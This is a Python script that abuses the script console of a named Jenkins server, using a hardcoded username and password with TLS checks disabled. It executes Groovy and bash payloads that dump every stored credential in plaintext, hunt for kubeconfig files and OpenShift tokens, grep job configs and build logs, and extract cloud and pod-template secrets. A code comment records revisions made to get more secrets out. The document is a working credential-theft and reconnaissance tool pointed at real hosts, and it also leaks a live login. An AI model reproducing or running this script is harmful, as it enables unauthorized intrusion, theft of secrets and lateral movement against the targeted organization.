import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=180).read().decode()


# Round 2 fixes:
#  - Task1 filter matched nothing -> dump ALL 11 credentials unfiltered w/ values
#  - Task2 504: find / too slow -> scope to jenkins/root/home, add timeouts
#  - Add Jenkins clouds dump (Kubernetes/OpenShift plugin: serverUrl + credentialsId)

TASK_A = r'''import com.cloudbees.plugins.credentials.*

def creds = CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardCredentials.class, Jenkins.instance, null, null)
creds.each { c ->
    println "=== ID: ${c.id} | ${c.class.simpleName} ==="
    println "  Desc: ${c.description}"
    try { println "  User: ${c.username}" } catch(e) {}
    try { println "  Pass: ${c.password}" } catch(e) {}
    try { println "  Secret: ${c.secret}" } catch(e) {}
    try { println "  Token: ${c.token}" } catch(e) {}
}
'''

TASK_B = r'''def r = ["bash","-c","""
which oc kubectl 2>/dev/null
echo '---CURL-API---'
curl -sk --max-time 8 https://console.dev.amxnova.net:8443/api/v1/namespaces 2>&1 | head -c 1500
echo ''
echo '---CURL-HEALTHZ---'
curl -sk --max-time 8 https://console.dev.amxnova.net:8443/healthz 2>&1 | head -c 300
echo ''
echo '---KUBE-DIRS---'
ls -la /var/jenkins_home/.kube /root/.kube 2>/dev/null
echo '---FIND-SCOPED---'
timeout 20 find /var/jenkins_home /root /home /opt -maxdepth 4 \\( -iname '*kubeconfig*' -o -iname '*openshift*' -o -iname '*oc_token*' -o -iname '.kube' \\) 2>/dev/null | head -20
"""].execute().text
println r
'''

TASK_C = r'''def r = ["bash","-c","""
echo '---AMXNOVA-CONFIGS---'
timeout 20 grep -ri 'amxnova' /var/jenkins_home/jobs --include='config.xml' -l 2>/dev/null | head -10
echo '---OC-LOGIN-CONFIGS---'
timeout 20 grep -riE 'oc login|oc project|openshift|kube' /var/jenkins_home/jobs --include='config.xml' 2>/dev/null | head -30
echo '---AMXNOVA-LOGS---'
timeout 25 grep -rl 'amxnova' /var/jenkins_home/jobs/*/builds 2>/dev/null | tail -5
echo '---ENV---'
env | grep -iE 'kube|oc_|openshift|token' 2>/dev/null | head -10
"""].execute().text
println r
'''

TASK_D = r'''Jenkins.instance.clouds.each { cl ->
    println "=== Cloud: ${cl.name} | ${cl.class.simpleName} ==="
    cl.properties.each { k, v ->
        if (v != null) {
            def s = v.toString()
            println "  ${k} = ${s.take(400)}"
        }
    }
}
println '---POD-TEMPLATES-ENV---'
Jenkins.instance.clouds.each { cl ->
    if (cl.class.simpleName.contains('Kubernetes') || cl.class.simpleName.contains('OpenShift')) {
        try {
            cl.templates.each { t ->
                println "POD: ${t.name} | ns=${t.namespace} | image=${t.containers?.image}"
                try { t.envVars.each { e -> println "  ENV ${e.key}=${e.value}" } } catch(x) {}
            }
        } catch(e2) { println "  no templates: ${e2.message}" }
    }
}
'''

TASKS = [
    ("TASK A: ALL Jenkins credentials UNFILTERED (values)", TASK_A),
    ("TASK B: OCP API reachability + scoped kubeconfig hunt", TASK_B),
    ("TASK C: amxnova/oc-login grep in configs+logs+env", TASK_C),
    ("TASK D: Jenkins clouds (K8s/OpenShift plugin config)", TASK_D),
]

if __name__ == '__main__':
    for label, script in TASKS:
        print('\n' + '=' * 80)
        print('[*] ' + label)
        print('=' * 80)
        try:
            out = jenkins_exec(script)
            print(out)
        except Exception as e:
            print('[-] ERROR: {}'.format(e))
